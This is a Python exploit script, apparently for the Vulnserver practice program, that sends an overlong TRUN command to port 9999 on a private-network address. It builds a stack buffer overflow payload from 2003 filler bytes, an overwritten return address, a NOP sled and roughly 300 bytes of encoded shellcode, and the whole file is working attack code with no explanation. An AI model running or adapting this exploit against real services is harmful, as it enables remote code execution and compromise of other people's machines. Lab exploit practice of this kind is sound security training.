import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 9999		# Change this

prefix = b'TRUN /.:/'
buffer = b'A' * 2003
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xba\x42\x45\x83\x9c\xdd\xc6\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x31\x83\xee\xfc\x31\x56\x0f"
shellcode += b"\x03\x56\x4d\xa7\x76\x60\xb9\xa5\x79\x99\x39"
shellcode += b"\xca\xf0\x7c\x08\xca\x67\xf4\x3a\xfa\xec\x58"
shellcode += b"\xb6\x71\xa0\x48\x4d\xf7\x6d\x7e\xe6\xb2\x4b"
shellcode += b"\xb1\xf7\xef\xa8\xd0\x7b\xf2\xfc\x32\x42\x3d"
shellcode += b"\xf1\x33\x83\x20\xf8\x66\x5c\x2e\xaf\x96\xe9"
shellcode += b"\x7a\x6c\x1c\xa1\x6b\xf4\xc1\x71\x8d\xd5\x57"
shellcode += b"\x0a\xd4\xf5\x56\xdf\x6c\xbc\x40\x3c\x48\x76"
shellcode += b"\xfa\xf6\x26\x89\x2a\xc7\xc7\x26\x13\xe8\x35"
shellcode += b"\x36\x53\xce\xa5\x4d\xad\x2d\x5b\x56\x6a\x4c"
shellcode += b"\x87\xd3\x69\xf6\x4c\x43\x56\x07\x80\x12\x1d"
shellcode += b"\x0b\x6d\x50\x79\x0f\x70\xb5\xf1\x2b\xf9\x38"
shellcode += b"\xd6\xba\xb9\x1e\xf2\xe7\x1a\x3e\xa3\x4d\xcc"
shellcode += b"\x3f\xb3\x2e\xb1\xe5\xbf\xc2\xa6\x97\x9d\x88"
shellcode += b"\x39\x25\x98\xfe\x3a\x35\xa3\xae\x52\x04\x28"
shellcode += b"\x21\x24\x99\xfb\x06\xca\x7b\x2e\x72\x63\x22"
shellcode += b"\xbb\x3f\xee\xd5\x11\x03\x17\x56\x90\xfb\xec"
shellcode += b"\x46\xd1\xfe\xa9\xc0\x09\x72\xa1\xa4\x2d\x21"
shellcode += b"\xc2\xec\x4d\xa4\x50\x6c\xbc\x43\xd1\x17\xc0"


payload = prefix + buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
